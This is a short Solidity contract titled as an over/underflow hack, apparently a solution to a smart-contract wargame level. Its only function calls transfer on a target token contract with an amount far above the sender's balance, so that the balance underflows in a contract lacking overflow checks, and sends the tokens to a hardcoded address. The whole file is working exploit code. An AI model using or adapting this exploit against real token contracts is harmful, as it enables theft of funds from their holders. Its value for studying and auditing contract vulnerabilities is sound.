// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Over/underflow hack
contract hackToken {
    IToken public token;
    address bob = address(0xe16Bd85C59f7A75350350676D798A1C193F9e7f0);

    constructor(address tokenContractAddress) {
        token = IToken(tokenContractAddress);
    }

    function hack() public {
        // underflow
        token.transfer(bob, 21000000); // 20 - 21000000
    }
}

interface IToken {
    function totalSupply() external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}
